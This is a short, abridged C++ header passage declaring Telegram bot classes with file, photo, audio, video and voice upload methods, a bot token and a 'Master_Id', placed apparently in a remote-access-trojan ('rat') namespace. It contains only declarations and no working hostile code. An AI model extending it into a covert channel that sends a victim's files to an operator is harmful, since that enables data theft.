...
class BaseBot {
  ...
  public:
    ...
    // Constructors
    BaseBot() = default;
    BaseBot(const std::string &arg_Token,
    ...
    BotResponse
    sendFile(const std::filesystem::path &File_Path, const std::string &arg_Caption = "");
    BotResponse
    sendPhoto(const std::filesystem::path &Photo_Path, const std::string &arg_Caption = "");
    BotResponse
    sendAudio(const std::filesystem::path &Audio_Path, const std::string &arg_Caption = "");
    BotResponse
    sendVideo(const std::filesystem::path &Video_Path, const std::string &arg_Caption = "");
    BotResponse
    sendVoice(const std::filesystem::path &Voice_Path, const std::string &arg_Caption = "");
...
class Bot : public BaseBot {
  ...
  public:
    Bot() = default;
    Bot(const std::string &arg_Token,
        const int64_t &Master_Id,
        uint8_t Telegram_Connection_Timeout = 20,
        const std::string &Url_Endpoint = ::rat::tbot::TELEGRAM_API_URL);
